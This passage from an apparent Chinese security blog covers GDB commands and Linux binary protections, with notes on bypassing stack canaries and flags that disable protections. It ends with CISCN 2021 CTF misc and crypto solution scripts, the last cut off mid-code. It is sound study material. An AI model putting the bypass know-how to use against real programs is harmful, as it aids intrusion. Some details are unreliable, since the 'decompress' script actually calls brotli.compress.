<p>info registers:查看除了浮点寄存器以外的寄存器<br>info all-registers: 查看所有的寄存器包括浮点寄存器<br>info registers &lt; registersName&gt;:查看指定寄存器<br>info break: 查看所有断点信息<br>info watchpoints: 查看当前设置的所有观察点<br>info signals info handle: 查看有哪些信号正在被gdb检测<br>info line: 查看源代码在内存中的地址<br>info threads: 可以查看多线程</p>
</blockquote>
<h4 id="finish命令"><a href="#finish命令" class="headerlink" title="finish命令"></a>finish命令</h4><p>执行完当前的函数。</p>
<p>run(缩写r)和quit(缩写q)分别可以开始运行程序和退出gdb调试</p>
<p>whatis或ptype显示变量的类型</p>
<p>bt显示函数调用路径</p>
<h4 id="x命令"><a href="#x命令" class="headerlink" title="x命令"></a>x命令</h4><p>x/&lt; n/f/u &gt; &lt; addr &gt;</p>
<p>n、f、u是可选的参数。</p>
<p>n是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。<br>f 表示显示的格式。如果地址所指的是字符串，那么格式可以是s，如果 地址是指令地址，那么格式可以是i。<br>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p>
<p>&lt; addr &gt; 表示一个内存地址。<br>n/f/u三个参数可以一起使用。例如：</p>
<blockquote>
<p>x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</p>
</blockquote>
<p>输出格式:<br>一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：</p>
<blockquote>
<p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。</p>
</blockquote>
<h4 id="简单的汇总"><a href="#简单的汇总" class="headerlink" title="简单的汇总"></a>简单的汇总</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">start                       <span class="comment">#开始调试,停在第一行代码处,(gdb)start</span></span><br><span class="line">l                           <span class="comment">#list的缩写查看源代码,(gdb) l [number/function]</span></span><br><span class="line">b &lt;lines&gt;                   <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b 10</span></span><br><span class="line">b &lt;func&gt;                    <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b main</span></span><br><span class="line">b filename:[line/<span class="keyword">function</span>]  <span class="comment">#b:在文件filename的某行或某个函数处设置断点</span></span><br><span class="line">i breakpoints               <span class="comment">#i:info 的简写。(gdb)i breakpoints</span></span><br><span class="line">d [bpNO]                    <span class="comment">#d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb)d 1</span></span><br><span class="line">s                           <span class="comment">#s: step执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；(gdb) s</span></span><br><span class="line">n                           <span class="comment">#n: next执行一行源程序代码，此行代码中的函数调用也一并执行。(gdb) n</span></span><br><span class="line">r                           <span class="comment">#Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。(gdb) r</span></span><br><span class="line">c                           <span class="comment">#Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。(gdb) c</span></span><br><span class="line">finish                      <span class="comment">#函数结束</span></span><br><span class="line">p [var]                     <span class="comment">#Print的简写，显示指定变量（临时变量或全局变量 例如 int a）的值。(gdb) p a</span></span><br><span class="line">display [var]               <span class="comment">#display，设置想要跟踪的变量(例如 int a)。(gdb) display a</span></span><br><span class="line">undisplay [varnum]          <span class="comment">#undisplay取消对变量的跟踪，被跟踪变量用整型数标识。(gdb) undisplay 1</span></span><br><span class="line"><span class="built_in">set</span> args                    <span class="comment">#可指定运行时参数。(gdb)set args 10 20  args可以是内存中某个地址</span></span><br><span class="line">show args                   <span class="comment">#查看运行时参数。</span></span><br><span class="line">x/&lt;n/f/u&gt; addr              <span class="comment">#查看内存中的值，n为数量，f为输出格式，u为值类型</span></span><br><span class="line">q                           <span class="comment">#Quit的简写，退出GDB调试环境。(gdb) q</span></span><br><span class="line"><span class="built_in">help</span> [cmd]                  <span class="comment">#GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。(gdb)help</span></span><br><span class="line">回车                        <span class="comment">#重复前面的命令，(gdb)回车</span></span><br></pre></td></tr></table></figure>
<h2 id="程序的保护机制"><a href="#程序的保护机制" class="headerlink" title="程序的保护机制"></a>程序的保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>该保护开启的程序运行时会在开辟的栈帧上设置一个可当作<code>令牌</code>一样的随机值，程序在运行过程中会对该值进行校验，一旦校验时发现该值被改变则立即停止程序运行。</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>开启Canary保护的程序在开辟栈帧时的结构如下：</p>
<blockquote>
<pre><code>   High
   Address |                 |
           +-----------------+
           | args            |
           +-----------------+
           | return address  |
           +-----------------+
   rbp =&gt;  | old ebp         |
           +-----------------+
 rbp-8 =&gt;  | canary value    |
           +-----------------+
           | 局部变量        |
   Low     |                 |
   Address
</code></pre></blockquote>
<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
<p>如果 Canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这意味可以通过劫持 <strong>__stack_chk_fail</strong> 的 <strong>got</strong> 值劫持流程或者利用 <strong>__stack_chk_fail</strong> 泄漏内容 (参见 stack smash)。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  <span class="built_in">THREAD_SET_STACK_GUARD</span> (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>PIE机制，在windows中被称作ASLR，即地址随机化。PIE在linux中作为内核参数存在，可在/proc/sys/kernel/randomize_va_space中找到其具体的值，0、1、2三个值代表不同的工作强度，具体如下：</p>
<ul>
<li>0 - 表示关闭进程地址空间随机化。</li>
<li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li>
<li>2 - 表示在1的基础上增加栈（heap）的随机化。</li>
</ul>
<p>另外，<strong>地址随机化保护</strong>有“两个开关”，一个是系统环境下的地址随机化设置，一个是gcc编译时的地址随机化设置。</p>
<p>只有当系统环境下的随机化保护开启时，程序的随机化保护才会生效。</p>
<blockquote>
<p>注：gcc的随机化设置不影响程序运行时的堆栈段地址，仅影响程序本身的bss、data、text静态段地址</p>
</blockquote>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
<h3 id="设置命令"><a href="#设置命令" class="headerlink" title="设置命令"></a>设置命令</h3><ul>
<li>NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</li>
<li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息</li>
<li>PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</li>
<li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
</ul>
<h2 id="上篇-汐白学Pwn-1-准备"><a href="#上篇-汐白学Pwn-1-准备" class="headerlink" title="上篇-汐白学Pwn-1(准备)/)"></a><a href="http://xibai.xyz/2019/10/30/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-1(Ready">上篇-汐白学Pwn-1(准备)</a>/)</h2><h2 id="下篇-汐白学pwn-3-1-ROP-Basic"><a href="#下篇-汐白学pwn-3-1-ROP-Basic" class="headerlink" title="下篇-汐白学pwn-3.1(ROP-Basic)/)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP">下篇-汐白学pwn-3.1(ROP-Basic)</a>/)</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-CISCN-First-Other</title>
    <url>/2021/05/19/2021-ciscn-first/</url>
    <content><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>拿到流量包审计流量发现两个可疑文件<code>test</code>和<code>secret</code>，查看服务器响应信息得知其使用<code>br</code>算法压缩，写个脚本解压缩</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = brotli.compress(f.read())</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret123&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        o.write(content)</span><br></pre></td></tr></table></figure>
<p><code>test</code>解压缩后得到<code>proto3</code>协议自定义规则。<br>python写个脚本用该规则读取<code>secret</code>中解压缩的数据得到flag，转一下格式即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flag_pb2 <span class="keyword">as</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_test</span>():</span></span><br><span class="line">    flag_msg = flag.PBResponse()</span><br><span class="line">    flag_msg_file = <span class="string">&quot;./secret123&quot;</span></span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(flag_msg_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    flag_msg.ParseFromString(f.read())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag_msg)</span><br></pre></td></tr></table></figure>
<h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>将<code>gif</code>文件分割后查看图片像素可以在<code>RGB</code>的低<code>3</code>位色道中看到一个突兀的小点，提取像素发现该值为(233,233,233)，且很多图片都有。<br>很明显该像素点的运动轨迹即为flag。运动轨迹提取脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">&#x27;./running_pixel.gif.ifl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">400</span>,<span class="number">400</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    tmp = Image.<span class="built_in">open</span>(<span class="string">&#x27;./running_pixel.gif.ifl/&#x27;</span>+file)</span><br><span class="line">    flag = <span class="number">0</span> ; tmp_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">            pixel = tmp.getpixel((j,i))</span><br><span class="line">            tmp_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pixel == (<span class="number">233</span>,<span class="number">233</span>,<span class="number">233</span>):</span><br><span class="line">                img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                tmp_num = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> tmp_num == <span class="number">160000</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        img.save(<span class="string">&#x27;flag&#x27;</span>+<span class="built_in">str</span>(num).zfill(<span class="number">2</span>)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">                img.putpixel((i,j),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="隔空喊话"><a href="#隔空喊话" class="headerlink" title="隔空喊话"></a>隔空喊话</h3><p>题目所给数据为<code>PDU</code>编码数据，工具解码即可看到关键提示。</p>
<p>查阅PDU编码格式资料发现第五行之后的数据时间顺序紊乱，脚本排序后再次解码可以得到宽高错误的<code>png</code>文件，提示<code>w465</code>，将宽度修改为465，高任意，然后打开即可看到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 时间戳排序脚本</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data123.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="comment">#36</span></span><br><span class="line">            tmp.append(line.strip())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)-<span class="number">1</span>):</span><br><span class="line">                tmp_data_1 = tmp[j]</span><br><span class="line">                tmp_data_2 = tmp[j+<span class="number">1</span>]</span><br><span class="line">                tmp_data_1 = tmp_data_1[<span class="number">42</span>:<span class="number">44</span>][::-<span class="number">1</span>]+tmp_data_1[<span class="number">44</span>:<span class="number">46</span>][::-<span class="number">1</span>]</span><br><span class="line">                tmp_data_2 = tmp_data_2[<span class="number">42</span>:<span class="number">44</span>][::-<span class="number">1</span>]+tmp_data_2[<span class="number">44</span>:<span class="number">46</span>][::-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(tmp_data_1[:<span class="number">2</span>]) * <span class="number">60</span> + <span class="built_in">int</span>(tmp_data_1[<span class="number">2</span>:]) &gt; <span class="built_in">int</span>(tmp_data_2[:<span class="number">2</span>]) * <span class="number">60</span> + <span class="built_in">int</span>(tmp_data_2[<span class="number">2</span>:]):</span><br><span class="line">                    tmp_data = tmp[j+<span class="number">1</span>]</span><br><span class="line">                    tmp[j+<span class="number">1</span>] = tmp[j]</span><br><span class="line">                    tmp[j] = tmp_data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            o.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解码后hex数据转文件</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.back.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data_hex&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            o.write(binascii.a2b_hex(line.strip()))</span><br></pre></td></tr></table></figure>
<h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p>查看流量包可以发现流量包中存在明文坐标数据。脚本提取坐标画图直接出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cap.pcapng&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        f.read(<span class="number">0x120</span>)</span><br><span class="line">        tmp = f.read(<span class="number">0x1c</span>)</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            length = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.read(<span class="number">4</span>)[::-<span class="number">1</span>]:</span><br><span class="line">                length = length * <span class="number">256</span> + i</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> length &gt;= <span class="number">135</span> <span class="keyword">and</span> length &lt;= <span class="number">140</span>:</span><br><span class="line">                <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">                    length += <span class="number">4</span> - length % <span class="number">4</span>    </span><br><span class="line">                o.write(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(length)[<span class="number">2</span>:]))</span><br><span class="line">                o.write(f.read(length))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">                    length += <span class="number">4</span> - length % <span class="number">4</span></span><br><span class="line">                f.read(length)</span><br><span class="line">            tmp = f.read(<span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;address.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        length = f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> length != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            data = f.read(length[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line">            l_index = data.index(<span class="string">b&#x27;Value\x00[&#x27;</span>)</span><br><span class="line">            l_index = data.index(<span class="string">b&#x27;[&#x27;</span>,l_index)</span><br><span class="line">            r_index = data.index(<span class="string">b&#x27;]&#x27;</span>,l_index)</span><br><span class="line">            data = data[l_index:r_index+<span class="number">1</span>]</span><br><span class="line">            data = data.decode()+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                o.write(data)</span><br><span class="line">            length = f.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;L&#x27;</span>,(<span class="number">400</span>,<span class="number">200</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;address.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = <span class="built_in">eval</span>(line.strip())</span><br><span class="line">        img.putpixel((line[<span class="number">0</span>],line[<span class="number">1</span>]),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>和2021虎符的题挺像。<br>先造格子LLL，规约出x和y；再用二分法算出p+q；再解方程求出p和q；剩下就是ECC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>,<span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"></span><br><span class="line">hn = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line">M = matrix([[hn, e],</span><br><span class="line">            [<span class="number">0</span>, -n]])</span><br><span class="line">L = M.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print (L)</span></span><br><span class="line"><span class="comment"># (-235436912945336662391026124471105219395770217328162018931594609419582745114251948238840212881814533708592325776478635076056630520429862826686225762483017735282225173655229129488512828712599656980161312082481987496707036067942329100, -406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409)</span></span><br><span class="line">mm = matrix(L)</span><br><span class="line"><span class="comment"># print ((-mm)/M)</span></span><br><span class="line">x, y = <span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span>, <span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p_puls_q</span>(<span class="params">K, N</span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">515</span>):</span><br><span class="line">        s = (l + r) // <span class="number">2</span></span><br><span class="line">        v = s * s - <span class="built_in">int</span>(<span class="number">9</span> * s ^ <span class="number">2</span> * (K - <span class="number">1</span> - s) * (K - <span class="number">1</span> - s)) // (<span class="built_in">round</span>(N ^ <span class="number">0.25</span>) * <span class="built_in">round</span>(N ^ <span class="number">0.25</span>))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span> * N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">k = e * x - y * n</span><br><span class="line">K = k // y</span><br><span class="line">s = find_p_puls_q(K, n)</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="comment"># s=18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span></span><br><span class="line">var(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">eq1 = p + q == s</span><br><span class="line">eq2 = p * q == n</span><br><span class="line">solve([eq1, eq2], p, q)</span><br><span class="line">p = <span class="number">7137110102022535123348664656689848983548191256934755709215236325084864398993149288243244941561397379979025441681860286823605147363784020425000696750337273</span></span><br><span class="line">q = <span class="number">11245903750132672161518170193934652665585973431569127453001587933757925633999288095689941407808547708674226876486050998886661484317436696430492652782266697</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">x, y = <span 